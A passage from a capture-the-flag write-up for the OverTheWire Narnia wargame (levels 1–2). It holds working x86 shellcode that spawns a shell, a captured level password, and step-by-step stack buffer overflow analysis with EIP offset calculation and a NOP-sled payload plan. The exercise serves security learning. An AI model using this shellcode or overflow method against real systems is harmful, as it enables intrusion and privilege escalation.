to not work:</span></p><a id="t.297e8ba1e2e089e52f079309f4e0e5c715343d20"></a><a id="t.13"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia1@narnia:/narnia$ </span><span class="c8">export</span><span class="c3">&nbsp;EGG=$(python -c </span><span class="c11">&quot;print &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>narnia1@narnia:/narnia$ </span><span class="c8">echo</span><span class="c3">&nbsp;</span><span class="c12">$EGG</span><span class="c3"><br>1Ph//shh/binPS &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#832; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>narnia1@narnia:/narnia$ ./narnia1<br>Trying to execute EGG! &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Segmentation fault &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span>I do not know why this particular shellcode does not work. However, trying a shellcode</span><sup><a href="#ftnt6" id="ftnt_ref6">[6]</a></sup><span class="c2">&nbsp;that executes /bin/bash does work:</span></p><a id="t.f86de5ea6b5573e1bcc14bf4046015ae9826d182"></a><a id="t.14"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia1@narnia:/narnia$ </span><span class="c8">export</span><span class="c3">&nbsp;EGG=$(python -c </span><span class="c11">&quot;print &#39;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&#39;&quot;</span><span class="c3">)<br>narnia1@narnia:/narnia$ ./narnia1<br>Trying to execute EGG!<br>bash-4.4$ whoami<br>narnia2<br>bash-4.4$ cat /etc/narnia_pass/narnia2<br>nairiepecu</span></p></td></tr></table><h3 class="c10" id="h.z2yo1owiuxq5"><span class="c5">Source Code</span></h3><a id="t.a18ad1654cd0c287232ad5a756264a1c1bba0b6b"></a><a id="t.15"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c8">#include &lt;stdio.h&gt;</span><span class="c3"><br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">main</span><span class="c8">()</span><span class="c3">{<br> &nbsp; &nbsp;</span><span class="c6">int</span><span class="c3">&nbsp;(*ret)();<br><br> &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">(getenv(</span><span class="c11">&quot;EGG&quot;</span><span class="c3">)==</span><span class="c8">NULL</span><span class="c3">){<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;Give me something to execute at the env-variable EGG\n&quot;</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">exit</span><span class="c3">(</span><span class="c8">1</span><span class="c3">);<br> &nbsp; &nbsp;}<br><br> &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;Trying to execute EGG!\n&quot;</span><span class="c3">);<br> &nbsp; &nbsp;ret = getenv(</span><span class="c11">&quot;EGG&quot;</span><span class="c3">);<br> &nbsp; &nbsp;ret();<br><br> &nbsp; &nbsp;</span><span class="c6">return</span><span class="c3">&nbsp;</span><span class="c8">0</span><span class="c3">;<br>}</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span>Note how the ret variable is not assigned a buffer. This is why the content of the environment variable was not seen in the ESP register during the analysis in pwndbg.</span></p><h2 class="c10" id="h.e4mp3rcoeyar"><span class="c40 c36">Narnia 2</span></h2><p class="c0"><span class="c2">Using the credentials obtained for the narnia2 user, we can execute the narnia2 binary.</span></p><a id="t.ecd8b69b2a87567956bf78380574ae3fbba06b6d"></a><a id="t.16"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia2</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">./narnia2<br></span><span class="c11">Usage:</span><span class="c3">&nbsp;./narnia2 argument<br>narnia2</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">./narnia2 A<br>Anarnia2</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c3">$</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span class="c2">Looking at the usage of the program, we see that it expects an argument. Inputting an argument of &ldquo;A&rdquo; just makes the program print out the same character. In essence, the program spits out whatever we put in. As usual, we will analyze the binary on a local attack box to understand it better:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 230.67px;"><img alt="" src="images/image8.png" style="width: 624.00px; height: 230.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">This is a 32 bit binary. It is not stripped which means the debug symbols will still be present within the binary. Furthermore, NX is disabled so we might be able to inject shellcode into the buffer and have the binary execute it. To detect a buffer overflow vulnerability, a large string of bytes were sent:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 262.67px;"><img alt="" src="images/image12.png" style="width: 624.00px; height: 262.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><h3 class="c10" id="h.y4f2ngky9lgd"><span class="c5">Binary Analysis</span></h3><p class="c0"><span class="c2">We can see that the program errors out with a &ldquo;Segmentation fault&rdquo; error. It is essential to investigate further into what might be happening by using a debugger program such as gdb. There are other great debugger programs such as radare2, IDA, Ghidra, among many others, and each one of them has their strengths and weaknesses (gdb and radare2 tend to be very strong dynamic analysis debugger programs, while Ghidra and IDA are more useful for static analysis).</span></p><a id="t.0b7d3f0fd3cc23d7c69d065401632115db4acae3"></a><a id="t.17"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; r $(python2 -c </span><span class="c11">&quot;print &#39;A&#39;*1000&quot;</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Starting program: /home/0xd4y/business/other/overthewire/narnia/</span><span class="c8">2</span><span class="c3">/narnia2 $(python2 -c </span><span class="c11">&quot;print &#39;A&#39;*1000&quot;</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Program received signal SIGSEGV, Segmentation fault. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0x41414141</span><span class="c3">&nbsp;</span><span class="c6">in</span><span class="c3">&nbsp;?? () &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c11">LEGEND:</span><span class="c3">&nbsp;STACK | HEAP | CODE | DATA | RWX | RODATA &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;[ REGISTERS ]&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<br> </span><span class="c8">EAX</span><span class="c3">&nbsp; </span><span class="c8">0x0</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> </span><span class="c8">EBX</span><span class="c3">&nbsp; </span><span class="c8">0x0</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> </span><span class="c8">ECX</span><span class="c3">&nbsp; </span><span class="c8">0x0</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> </span><span class="c8">EDX</span><span class="c3">&nbsp; </span><span class="c8">0x0</span><span class="c3"><br> </span><span class="c8">EDI</span><span class="c3">&nbsp; </span><span class="c8">0xf7fa6000</span><span class="c3">&nbsp;(_GLOBAL_OFFSET_TABLE_) &#9666;-- </span><span class="c6">insb</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">byte</span><span class="c3">&nbsp;</span><span class="c8">ptr</span><span class="c3">&nbsp;</span><span class="c8">es</span><span class="c3">:[</span><span class="c8">edi</span><span class="c3">], </span><span class="c8">dx</span><span class="c3">&nbsp;/* </span><span class="c8">0x1e4d6c</span><span class="c3">&nbsp;*/<br> </span><span class="c8">ESI</span><span class="c3">&nbsp; </span><span class="c8">0xf7fa6000</span><span class="c3">&nbsp;(_GLOBAL_OFFSET_TABLE_) &#9666;-- </span><span class="c6">insb</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">byte</span><span class="c3">&nbsp;</span><span class="c8">ptr</span><span class="c3">&nbsp;</span><span class="c8">es</span><span class="c3">:[</span><span class="c8">edi</span><span class="c3">], </span><span class="c8">dx</span><span class="c3">&nbsp;/* </span><span class="c8">0x1e4d6c</span><span class="c3">&nbsp;*/<br> </span><span class="c8">EBP</span><span class="c3">&nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp;(</span><span class="c11">&#39;AAAA&#39;</span><span class="c3">)<br> </span><span class="c8">ESP</span><span class="c3">&nbsp; </span><span class="c8">0xffffcc60</span><span class="c3">&nbsp;&#9666;-- </span><span class="c8">0x41414141</span><span class="c3">&nbsp;(</span><span class="c11">&#39;AAAA&#39;</span><span class="c3">)<br> </span><span class="c8">EIP</span><span class="c3">&nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp;(</span><span class="c11">&#39;AAAA&#39;</span><span class="c3">)<br>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;[ DISASM ]&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<br>Invalid address </span><span class="c8">0x41414141</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><h4 class="c21" id="h.p5qp0v2f6sef"><span>Calculating EIP Offset</span></h4><p class="c0"><span>After running the program in gdb and providing 1000 A&rsquo;s as the argument, the EIP register was successfully overwritten to </span><span class="c8">0x41414141</span><span class="c2">. To find the offset, the cyclic function can be used as follows:</span></p><a id="t.23a69b1c7aba7f54ae9c0a6a6b79d8942ba68abe"></a><a id="t.18"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; r $(cyclic </span><span class="c8">1000</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [</span><span class="c8">11</span><span class="c3">/</span><span class="c8">205</span><span class="c3">]<br>Starting program: /home/0xd4y/business/other/overthewire/narnia/</span><span class="c8">2</span><span class="c3">/narnia2 $(cyclic </span><span class="c8">1000</span><span class="c3">)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Program received signal SIGSEGV, Segmentation fault.<br></span><span class="c8">0x62616169</span><span class="c3">&nbsp;</span><span class="c6">in</span><span class="c3">&nbsp;?? ()<br></span><span class="c11">LEGEND:</span><span class="c3">&nbsp;STACK | HEAP | CODE | DATA | RWX | RODATA<br>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;[ REGISTERS ]&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<br> </span><span class="c8">EAX</span><span class="c3">&nbsp; </span><span class="c8">0x0</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; <br> </span><span class="c8">EBX</span><span class="c3">&nbsp; </span><span class="c8">0x0</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; <br> </span><span class="c8">ECX</span><span class="c3">&nbsp; </span><span class="c8">0x0</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; <br> </span><span class="c8">EDX</span><span class="c3">&nbsp; </span><span class="c8">0x0</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; <br> </span><span class="c8">EDI</span><span class="c3">&nbsp; </span><span class="c8">0xf7fa6000</span><span class="c3">&nbsp;(_GLOBAL_OFFSET_TABLE_) &#9666;-- </span><span class="c6">insb</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">byte</span><span class="c3">&nbsp;</span><span class="c8">ptr</span><span class="c3">&nbsp;</span><span class="c8">es</span><span class="c3">:[</span><span class="c8">edi</span><span class="c3">], </span><span class="c8">dx</span><span class="c3">&nbsp;/* </span><span class="c8">0x1e4d6c</span><span class="c3">&nbsp;*/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> </span><span class="c8">ESI</span><span class="c3">&nbsp; </span><span class="c8">0xf7fa6000</span><span class="c3">&nbsp;(_GLOBAL_OFFSET_TABLE_) &#9666;-- </span><span class="c6">insb</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">byte</span><span class="c3">&nbsp;</span><span class="c8">ptr</span><span class="c3">&nbsp;</span><span class="c8">es</span><span class="c3">:[</span><span class="c8">edi</span><span class="c3">], </span><span class="c8">dx</span><span class="c3">&nbsp;/* </span><span class="c8">0x1e4d6c</span><span class="c3">&nbsp;*/<br> </span><span class="c8">EBP</span><span class="c3">&nbsp; </span><span class="c8">0x62616168</span><span class="c3">&nbsp;(</span><span class="c11">&#39;haab&#39;</span><span class="c3">)<br> </span><span class="c8">ESP</span><span class="c3">&nbsp; </span><span class="c8">0xffffcc60</span><span class="c3">&nbsp;&#9666;-- </span><span class="c8">0x6261616a</span><span class="c3">&nbsp;(</span><span class="c11">&#39;jaab&#39;</span><span class="c3">)<br> </span><span class="c8">EIP</span><span class="c3">&nbsp; </span><span class="c8">0x62616169</span><span class="c3">&nbsp;(</span><span class="c11">&#39;iaab&#39;</span><span class="c3">)<br>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;[ DISASM ]&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<br>Invalid address </span><span class="c8">0x62616169</span></p></td></tr></table><p class="c0"><span class="c31 c54">Observe that the EIP register has changed in value causing the instruction pointer to return to an unexpected address and crash</span></p><p class="c0"><span>Seeing that the EIP register is now </span><span class="c8">0x62616169</span><span>, the offset can now be calculated with the </span><span class="c27">-l</span><span class="c2">&nbsp;flag:</span></p><a id="t.13adbe9c7c0214517cf483fdacb43b32d9f03301"></a><a id="t.19"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; cyclic -l </span><span class="c8">0x62616169</span><span class="c3"><br></span><span class="c8">132</span></p></td></tr></table><p class="c29 c90"><span class="c2"></span></p><p class="c0"><span class="c2">Thus, 132 bytes can be passed before overwriting the EIP register. We can view what is inside the stack by accessing the ESP register. This register is responsible for pointing to the top of the stack.</span></p><h5 class="c75 c82" id="h.6f0mxmx57b85"><span class="c49 c36 c76">How the Buffer Relates to the Stack</span></h5><p class="c0"><span class="c2">The buffer is where data is temporarily stored, and it is located in the RAM (random access memory) of the computer. When there is improper validation as to the content and size of the buffer, the program can experience an overflow in which inputted data floods the memory of the program.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 428.00px;"><img alt="" src="images/image2.png" style="width: 624.00px; height: 428.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><sup><a href="#ftnt7" id="ftnt_ref7">[7]</a></sup><span>&nbsp;</span><span class="c50 c49 c31 c46">A visual image of how a buffer overflow attack can overwrite memory</span></p><p class="c0"><span class="c2">As more data gets inputted into the buffer, the stored data of the program (located in the stack) gets overwritten in the following order:</span></p><ol class="c42 lst-kix_4odmxee0jpwg-0 start" start="1"><li class="c0 c66 li-bullet-0"><span class="c2">Local variables</span></li><li class="c0 c66 li-bullet-0"><span class="c2">Saved registers</span></li><li class="c0 c66 li-bullet-0"><span class="c2">Return address</span></li><li class="c0 c66 li-bullet-0"><span class="c2">Function arguments (parameters)</span></li></ol><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 324.00px;"><img alt="" src="images/image4.png" style="width: 624.00px; height: 324.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><sup><a href="#ftnt8" id="ftnt_ref8">[8]</a></sup><span>&nbsp;</span><span class="c50 c49 c31 c46">A simplified image on how the buffer relates to the stack</span></p><p class="c0"><span>When a program allocates a fixed number of bytes into the buffer, the memory of the buffer will end up spilling into the EBP (base pointer), ESP (stack pointer), and EIP (instruction pointer) registers. The EIP register will hold the return address, while the ESP register contains the data of the program. The EBP register is typically reserved as a backup for the ESP in case the ESP is modified during execution of a function (note that the EBP register can be overflowed as well).</span></p><h3 class="c10" id="h.9gl2y6eg1cdw"><span class="c5">Constructing a Payload</span></h3><p class="c0"><span class="c2">Now with the knowledge of the EIP offset (132 bytes), we can construct a payload that will look like the following:</span></p><p class="c0 c29"><span class="c45 c46 c27 c61"></span></p><p class="c25"><span class="c49 c36">JUNK_BYTE * 132 + ADDRESS_TO_SHELLCODE + NOP_SLED + SHELLCODE</span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span>In regards to the payload, it is important to emphasize what is the purpose of a NOP sled and what it is. </span><span class="c2">A NOP sled is a series of NOP (no operation) bytes, which is an instruction that occupies space in memory, but tells the program to not do anything. The purpose of a NOP sled in binary exploitation is to allow a greater leniency when determining the proper address to flood the EIP register with. When the shellcode is put after the NOP sled and the instruction pointer is pointing to somewhere within the bounds of the NOP sled, the program will essentially go through each NOP instruction until it executes the shellcode. </span></p><h3 class="c10" id="h.jqrye1p9mibs"><span class="c5">Binary 